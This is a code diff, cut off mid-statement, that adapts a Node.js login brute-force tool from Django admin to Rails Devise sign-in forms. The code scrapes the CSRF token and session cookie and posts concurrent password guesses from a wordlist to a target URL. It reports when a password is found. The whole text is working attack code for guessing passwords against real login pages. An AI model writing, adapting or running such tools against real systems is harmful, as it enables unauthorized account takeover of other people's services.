@@ -11,8 +11,8 @@ var async    = require('async');
 // Usage message
 if (process.argv.length !== 6) {
   console.log(
-    'NodeJS Django Admin Login Bruteforce 1.0\n' +
-    'Usage: ./djangoAdmin.js <username> <wordlist> <target url> <max concurrent requests>' 
+    'NodeJS Rails Devise Login Bruteforce 1.0\n' +
+    'Usage: ./railsDevise.js <username> <wordlist> <target url> <max concurrent requests>' 
   );
 
   process.exit();
@@ -25,57 +25,57 @@ var BASE_URL    = process.argv[4];
 var CONCURRENCY = process.argv[5];
 
 // Set regexp to define CSRF and login errors
-var CSRF    = /<input type='hidden' name='csrfmiddlewaretoken' value='(.*)' \/>/;
-var ERROR_1 = /Please enter the correct username/ ;
-var ERROR_2 = /Please correct the error below/;
+var CSRF  = /<input name="authenticity_token" type="hidden" value="(.*)" \/>/;
+var ERROR = /Invalid email or password/ ;
 
 // Configure the CSRF token request
 var csrfOptions = {
   url: BASE_URL,
   method: 'GET',
-  headers: {}
+  headers: {},
 };
 
 // Define function to extract CSRF token
 var getCSRF = function(callback) {
   request(csrfOptions, function (error, response, body) {
     if (!error && response.statusCode == 200) {
-      callback(body.match(CSRF)[1]);
+      var cookieString = response.headers['set-cookie'][0];
+      var csrfToken    = body.match(CSRF)[1];
+
+      callback(csrfToken, cookieString);
     }
   });
 };
 
 // Configure the login request
-var loginOptions = function(password, csrfToken) {
+var loginOptions = function(password, csrfToken, cookieString) {
   return {
-    url: BASE_URL + '/login/',
+    url: BASE_URL,
     method: 'POST',
     headers: { 
-      Referer: BASE_URL,
-      Cookie: 'csrftoken=' + csrfToken 
+      Cookie: cookieString 
     },
     form: {
-      csrfmiddlewaretoken: csrfToken,
-      username: USERNAME,
-      password: password,
-      next: '/admin/'
+      'authenticity_token': csrfToken,
+      'user[email]': USERNAME,
+      'user[password]': password,
+      'commit': 'Sign+in'
     }
   };
 };
 
 var tryLogin = function(password, callback) {
 
-  getCSRF(function(token) {
-    var opt = loginOptions(password, token);
-
+  getCSRF(function(token, cookieString) {
+    var opt = loginOptions(password, token, cookieString);
     // Send a login POST
     request(opt, function (error, response, body) {
-
+      console.log(opt)
       if (!error) { 
         // If we match known regex password is incorrect
-        if ( response.statusCode === 200 && (body.match(ERROR_1) || body.match(ERROR_2))) {
+        if (response.statusCode === 200 && body.match(ERROR)) {
           console.log('[-] Invalid: ' + password);
-        } else if (response.statusCode < 500) {
+        } else if (response.statusCode < 400) {
           console.log(
             '[+] FOUND: ' + password  +
             '\n[+] Shutting down....' 
